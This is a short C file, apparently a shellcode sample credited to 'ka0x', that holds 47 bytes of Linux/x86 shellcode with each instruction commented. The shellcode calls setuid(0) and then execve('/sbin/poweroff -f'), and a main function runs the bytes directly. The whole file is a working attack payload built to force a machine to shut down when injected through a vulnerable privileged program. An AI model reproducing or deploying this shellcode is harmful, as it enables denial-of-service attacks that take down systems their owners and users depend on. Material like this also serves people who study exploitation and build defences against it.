#include <stdio.h>

/*
	linux/x86 ; setuid(0) & execve("/sbin/poweroff -f") 47 bytes
	written by ka0x - <ka0x01[alt+64]gmail.com>
	lun sep 21 16:40:16 CEST 2009

	greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek, Hendrix and others!
*/

int main()
{
	char shellcode[] =
			"\x31\xdb"		// xor ebx,ebx
			"\x6a\x17"		// push byte 0x17
			"\x58"			// pop eax
			"\xcd\x80"		// int 80h
			"\x8d\x43\x0b"		// lea eax,[ebx+0xb]
			"\x99"			// cdq
			"\x52"			// push edx
			"\x66\x68\x66\x66"	// push word 0x6666
			"\x68\x77\x65\x72\x6f"	// push dword 0x6f726577
			"\x68\x6e\x2f\x70\x6f"	// push dword 0x6f702f6e
			"\x68\x2f\x73\x62\x69"	// push dword 0x6962732f
			"\x89\xe3"		// mov ebx,esp
			"\x52"			// push edx
			"\x66\x68\x2d\x66"	// push word 0x662d
			"\x89\xe1"		// mov ecx,esp
			"\x52"			// push edx
			"\x51"			// push ecx
			"\x53"			// push ebx
			"\x89\xe1"		// mov ecx,esp
			"\xcd\x80" ;		// int 80h

	printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
	(*(void(*)()) shellcode)();

	return 0;
}